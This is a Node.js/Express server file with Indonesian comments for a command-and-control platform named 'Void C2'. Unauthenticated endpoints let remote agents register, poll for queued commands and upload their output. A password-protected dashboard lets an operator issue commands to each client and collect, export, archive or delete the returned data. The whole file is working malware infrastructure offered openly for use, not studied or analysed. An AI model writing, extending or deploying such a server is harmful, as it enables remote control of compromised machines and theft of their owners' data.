const express = require('express');
const mysql = require('mysql2/promise');
const fs = require('fs');
const fsp = require('fs').promises;
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
const VERBOSE = process.env.VERBOSE === 'true' || process.argv.includes('--verbose');
const log = (...args) => { if (VERBOSE) console.log(...args); };
const logErr = (...args) => console.error(...args); // error tetap tampil

const STORAGE_DIR = path.join(__dirname, 'storage', 'outputs');
const ARCHIVE_DIR = path.join(__dirname, 'archive');
const SIZE_LIMIT_BYTES = 1 * 1024 * 1024;

for (const dir of [STORAGE_DIR, ARCHIVE_DIR]) {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

// Menggunakan Environment Variables untuk kredensial database agar aman di GitHub
const db = mysql.createPool({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || 'YourSecurePasswordHere',
    database: process.env.DB_NAME || 'c2_db',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

(async () => {
    try {
        const conn = await db.getConnection();
        log('✅ Berhasil connect MariaDB');
        conn.release();
    } catch (err) {
        console.error('❌ Gagal Connect ke Database:', err.message);
        process.exit(1);
    }
})();

app.use((req, res, next) => {
    if (VERBOSE) {
        const timestamp = new Date().toISOString();
        log(`\n[${timestamp}] ${req.method.padEnd(6)} ${req.url}`);
        if (Object.keys(req.query).length > 0) {
            log(`       Query:`, JSON.stringify(req.query));
        }
    }
    next();
});

app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.json({ limit: '100mb' }));
app.use(express.text({ type: '*/*', limit: '100mb' }));
app.use(express.static(__dirname));

// ==========================================
// MIDDLEWARE PROTEKSI DASHBOARD (Basic Auth)
// ==========================================
const authMiddleware = (req, res, next) => {
    const authHeader = req.headers.authorization;
    
    // Menggunakan Environment Variables untuk kredensial dashboard admin
    const USERNAME = process.env.DASHBOARD_USER || 'admin';
    const PASSWORD = process.env.DASHBOARD_PASSWORD || 'ChangeMe123!';

    if (!authHeader) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Void C2 Secure Area"');
        return res.status(401).send('Authentication required.');
    }

    try {
        const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
        const user = auth[0];
        const pass = auth[1];

        if (user === USERNAME && pass === PASSWORD) {
            return next(); // Kredensial cocok, lanjutkan akses
        }
    } catch (error) {
        // Abaikan error parsing header dan langsung lempar ke 401
    }

    res.setHeader('WWW-Authenticate', 'Basic realm="Void C2 Secure Area"');
    return res.status(401).send('Authentication failed.');
};

// FIXED: Menggunakan HTTP Range Requests untuk menyajikan streaming video
app.get('/media/background', (req, res) => {
    const videoPath = path.join(__dirname, 'blackhole.mp4');
    
    if (!fs.existsSync(videoPath)) {
        return res.status(404).send('Video missing');
    }

    const stat = fs.statSync(videoPath);
    const fileSize = stat.size;
    const range = req.headers.range;

    if (range) {
        const parts = range.replace(/bytes=/, "").split("-");
        const start = parseInt(parts[0], 10);
        const end = parts[1] ? parseInt(parts[1], 10) : fileSize - 1;

        if (start >= fileSize || end >= fileSize) {
            res.status(416).set('Content-Range', `bytes */${fileSize}`).send();
            return;
        }

        const chunksize = (end - start) + 1;
        const file = fs.createReadStream(videoPath, { start, end });
        
        const head = {
            'Content-Range': `bytes ${start}-${end}/${fileSize}`,
            'Accept-Ranges': 'bytes',
            'Content-Length': chunksize,
            'Content-Type': 'video/mp4',
        };
        
        res.writeHead(206, head);
        file.pipe(res);
    } else {
        const head = {
            'Content-Length': fileSize,
            'Content-Type': 'video/mp4',
        };
        res.writeHead(200, head);
        fs.createReadStream(videoPath).pipe(res);
    }
});

// ==========================================
// CLIENT ENDPOINTS (CPP agent) - TIDAK DIPROTEKSI
// ==========================================
app.get('/poll', async (req, res) => {
    const clientId = req.query.client || 'unknown';
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip || req.connection.remoteAddress;
    try {
        db.query(
            `INSERT INTO clients (client_id, ip) VALUES (?, ?) ON DUPLICATE KEY UPDATE last_seen = CURRENT_TIMESTAMP`,
            [clientId, clientIp]
        ).catch(err => console.error('[POLL] ❌ DB Error:', err.message));

        const [rows] = await db.query(
            `SELECT id, command FROM commands WHERE client_id = ? AND status = 'pending' LIMIT 1`,
            [clientId]
        );

        if (!rows || rows.length === 0) return res.send('none');

        const cmd = rows[0];
        db.query(`UPDATE commands SET status = 'sent' WHERE id = ?`, [cmd.id])
            .catch(err => console.error('[POLL] ❌ DB Error:', err.message));

        log(`        ✓ Sent command to ${clientId}: ${cmd.command.substring(0, 60)}`);
        res.send(cmd.command);
    } catch (err) {
        console.error('[POLL] ❌ Error:', err.message);
        res.send('none');
    }
});

app.post('/output', async (req, res) => {
    const clientId = req.query.client || 'unknown';
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.ip || req.connection.remoteAddress;
    let outputText = '';

    if (typeof req.body === 'string') {
        outputText = req.body;
    } else if (req.body && typeof req.body === 'object') {
        if (req.body.data)        outputText = req.body.data;
        else if (req.body.output) outputText = req.body.output;
        else                      outputText = JSON.stringify(req.body);
    }

    outputText = outputText.trim();
    if (outputText.length === 0) return res.send('OK');

    const byteSize = Buffer.byteLength(outputText, 'utf8');

    try {
        let savedValue = outputText;
        if (byteSize >= SIZE_LIMIT_BYTES) {
            const ts = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `${ts}_${clientId}.txt`;
            const filepath = path.join(STORAGE_DIR, filename);
            await fsp.writeFile(filepath, outputText, 'utf8');
            savedValue = `[FILE] ${filepath}`;
        }
        await db.query(`INSERT INTO outputs (client_id, output) VALUES (?, ?)`, [clientId, savedValue]);
        res.send('OK');
    } catch (err) {
        console.error(`        ❌ Error:`, err.message);
        res.status(500).send('Error');
    }
});

// ==========================================
// API ENDPOINTS (untuk index.html) - DIPROTEKSI
// ==========================================

// GET semua data sekaligus (dashboard stats + clients + outputs + pending)
app.get('/api/data', authMiddleware, async (req, res) => {
    try {
        const [[clients], [outputs], [pending], [[cmdStats]]] = await Promise.all([
            db.query(`SELECT * FROM clients ORDER BY client_id ASC`),
            db.query(`SELECT * FROM outputs ORDER BY received_at DESC LIMIT 200`),
            db.query(`SELECT * FROM commands WHERE status = 'pending'`),
            db.query(`SELECT COUNT(*) as total, SUM(status='sent') as sent FROM commands`)
        ]);
        res.json({ clients, outputs, pending, cmdStats });
    } catch (err) {
        console.error('[API] ❌ Error:', err.message);
        res.status(500).json({ error: 'Database error' });
    }
});

// GET outputs saja (untuk polling live update)
app.get('/api/outputs', authMiddleware, async (req, res) => {
    const since = req.query.since || null; // ID terakhir yang sudah diterima
    try {
        let query = `SELECT * FROM outputs`;
        let params = [];
        if (since) {
            query += ` WHERE id > ?`;
            params.push(parseInt(since));
        }
        query += ` ORDER BY received_at DESC LIMIT 200`;
        const [outputs] = await db.query(query, params);
        res.json(outputs);
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

// GET clients saja
app.get('/api/clients', authMiddleware, async (req, res) => {
    try {
        const [clients] = await db.query(`SELECT * FROM clients ORDER BY client_id ASC`);
        res.json(clients);
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

// POST kirim command (dari index.html)
app.post('/api/send', authMiddleware, async (req, res) => {
    const { client_id, command } = req.body;
    if (!client_id || !command) return res.status(400).json({ error: 'Missing data' });
    try {
        const [result] = await db.query(
            `INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')`,
            [client_id, command]
        );
        res.json({ ok: true, id: result.insertId });
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

// GET archive (SSE)
app.get('/admin/archive', authMiddleware, async (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();
    const send = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);

    try {
        const [[{ total }]] = await db.query(`SELECT COUNT(*) as total FROM outputs`);
        if (total === 0) {
            send({ type: 'done', message: 'Tidak ada data untuk diarsip.', total: 0 });
            return res.end();
        }

        send({ type: 'start', total });
        const archiveFilename = `outputs_${new Date().toISOString().split('T')[0]}_${Date.now()}.log`;
        const archivePath = path.join(ARCHIVE_DIR, archiveFilename);
        const writeStream = fs.createWriteStream(archivePath, { encoding: 'utf8' });

        const BATCH_SIZE = 100;
        let offset = 0, processed = 0;
        const exportedIds = [];

        while (offset < total) {
            const [rows] = await db.query(
                `SELECT id, client_id, output, received_at FROM outputs ORDER BY id ASC LIMIT ? OFFSET ?`,
                [BATCH_SIZE, offset]
            );
            if (rows.length === 0) break;

            for (const row of rows) {
                writeStream.write(`[${row.received_at}] | CLIENT=${row.client_id} | ID=${row.id} | OUTPUT=${row.output}\n`);
                exportedIds.push(row.id);
            }
            processed += rows.length; offset += BATCH_SIZE;
            send({ type: 'progress', processed, total, percent: Math.round((processed / total) * 100) });
            await new Promise(r => setTimeout(r, 10));
        }

        await new Promise((resolve, reject) => { writeStream.end(resolve); writeStream.on('error', reject); });
        const [delResult] = await db.query(`DELETE FROM outputs WHERE id IN (?)`, [exportedIds]);
        send({ type: 'done', message: `Berhasil mengarsip ${delResult.affectedRows} rows`, file: archiveFilename, total: delResult.affectedRows });
    } catch (err) {
        send({ type: 'error', message: err.message });
    }
    res.end();
});

// POST export outputs ke archive/ lalu kirim ke browser
app.post('/api/outputs/export', authMiddleware, async (req, res) => {
    const format = (req.body.format || 'txt').toLowerCase();
    try {
        const [rows] = await db.query(
            `SELECT id, client_id, output, received_at FROM outputs ORDER BY received_at ASC`
        );
        if (rows.length === 0) return res.status(400).json({ error: 'Tidak ada data' });

        const dateStr = new Date().toISOString().split('T')[0];
        const filename = `outputs_${dateStr}_${Date.now()}.${format}`;
        const filepath = path.join(ARCHIVE_DIR, filename);

        let fileContent = '';
        if (format === 'txt') {
            fileContent = rows.map(r =>
                `[${r.received_at}] | CLIENT=${r.client_id} | ID=${r.id} | OUTPUT=${r.output}`
            ).join('\n');
        } else if (format === 'csv') {
            const lines = ['time,client_id,id,output'];
            for (const r of rows) {
                const esc = (r.output || '').replace(/"/g, '""');
                lines.push(`"${r.received_at}","${r.client_id}","${r.id}","${esc}"`);
            }
            fileContent = lines.join('\n');
        } else if (format === 'json') {
            fileContent = JSON.stringify(rows, null, 2);
        } else {
            return res.status(400).json({ error: 'Format tidak didukung' });
        }

        await fsp.writeFile(filepath, fileContent, 'utf8');
        res.json({ ok: true, filename });
    } catch (err) {
        console.error('[EXPORT]', err.message);
        res.status(500).json({ error: err.message });
    }
});

// DELETE semua outputs dari DB
app.delete('/api/outputs/clear', authMiddleware, async (req, res) => {
    try {
        const [result] = await db.query(`DELETE FROM outputs`);
        res.json({ ok: true, deleted: result.affectedRows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Route / serve index.html - DIPROTEKSI
app.get('/', authMiddleware, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 VOID C2 Server running at http://0.0.0.0:${PORT}\n`);
});
